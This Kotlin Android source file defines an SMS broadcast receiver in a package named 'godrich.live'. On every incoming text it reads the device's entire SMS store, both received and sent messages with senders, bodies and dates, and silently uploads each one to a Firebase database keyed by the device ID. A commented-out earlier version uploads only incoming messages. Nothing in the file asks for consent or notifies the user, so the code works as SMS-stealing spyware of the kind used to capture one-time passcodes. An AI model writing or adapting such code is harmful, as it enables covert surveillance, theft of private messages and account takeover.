//
//
//
//package godrich.live
//
//import android.content.BroadcastReceiver
//import android.content.Context
//import android.content.Intent
//import android.provider.Settings
//import android.provider.Telephony
//import com.google.firebase.database.FirebaseDatabase
//import java.text.SimpleDateFormat
//import java.util.*
//
//class SmsReceiver : BroadcastReceiver() {
//    override fun onReceive(context: Context, intent: Intent) {
//        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION == intent.action) {
//            for (sms in Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
//                val sender = sms.displayOriginatingAddress ?: "Unknown"
//                val body = sms.messageBody ?: ""
//                val id = System.currentTimeMillis().toString()
//                val dateTime = SimpleDateFormat("dd/MM/yyyy | hh:mm a", Locale.getDefault())
//                    .format(Date())
//
//                val deviceId = Settings.Secure.getString(
//                    context.contentResolver,
//                    Settings.Secure.ANDROID_ID
//                )
//
//                val smsEntry = mapOf(
//                    "dateTime" to dateTime,
//                    "id" to id,
//                    "message" to body,
//                    "sender" to sender,
//                    "type" to "incoming"
//                )
//
//                FirebaseDatabase.getInstance()
//                    .getReference("messages/$deviceId/$id")
//                    .setValue(smsEntry)
//            }
//        }
//    }
//}


package godrich.live

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.database.Cursor
import android.net.Uri
import android.provider.Settings
import android.provider.Telephony
import com.google.firebase.database.FirebaseDatabase
import java.text.SimpleDateFormat
import java.util.*

class SmsReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        // Whenever an SMS is received, re-scan the whole SMS inbox
        readAllSmsAndSendToFirebase(context)
    }

    private fun readAllSmsAndSendToFirebase(context: Context) {
        try {
            val uriSms = Telephony.Sms.CONTENT_URI
            val cursor: Cursor? = context.contentResolver.query(
                uriSms,
                arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE, Telephony.Sms.TYPE),
                null,
                null,
                Telephony.Sms.DEFAULT_SORT_ORDER
            )

            if (cursor != null && cursor.moveToFirst()) {
                val deviceId = Settings.Secure.getString(
                    context.contentResolver,
                    Settings.Secure.ANDROID_ID
                )

                val database = FirebaseDatabase.getInstance()
                val dateFormat = SimpleDateFormat("dd/MM/yyyy | hh:mm a", Locale.getDefault())

                var count = 0
                do {
                    val address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)) ?: "Unknown"
                    val body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)) ?: ""
                    val dateMillis = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE))
                    val type = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE))
                    val id = "$dateMillis-$address"

                    val typeStr = when (type) {
                        Telephony.Sms.MESSAGE_TYPE_INBOX -> "incoming"
                        Telephony.Sms.MESSAGE_TYPE_SENT -> "outgoing"
                        else -> "other"
                    }

                    val smsEntry = mapOf(
                        "dateTime" to dateFormat.format(Date(dateMillis)),
                        "id" to id,
                        "message" to body,
                        "sender" to address,
                        "type" to typeStr
                    )

                    database.getReference("messages/$deviceId/$id").setValue(smsEntry)
                    count++
                } while (cursor.moveToNext())

                cursor.close()
                println("Uploaded $count messages to Firebase.")
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
